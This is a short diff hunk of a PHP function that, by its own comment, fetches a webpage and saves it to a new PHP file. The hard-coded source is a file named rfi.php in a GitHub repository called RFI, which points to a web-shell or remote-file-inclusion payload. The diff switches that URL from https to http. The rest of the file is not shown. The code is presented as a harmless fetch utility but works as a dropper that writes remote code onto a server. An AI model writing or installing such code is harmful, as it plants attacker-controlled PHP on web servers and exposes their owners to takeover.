@@ -2,7 +2,7 @@
 // Function to fetch the content of a webpage and save it to a new PHP file
 function fetchAndSaveWebpageContent() {
     // URL of the webpage you want to fetch (replace this with your desired URL)
-    $webpageURL = 'https://raw.githubusercontent.com/iamjackmorton/RFI/refs/heads/main/rfi.php';  // Replace with the URL of the webpage you want to fetch
+    $webpageURL = 'http://raw.githubusercontent.com/iamjackmorton/RFI/refs/heads/main/rfi.php';  // Replace with the URL of the webpage you want to fetch
 
     // Use file_get_contents to fetch the content of the webpage
     $webpageContent = file_get_contents($webpageURL);
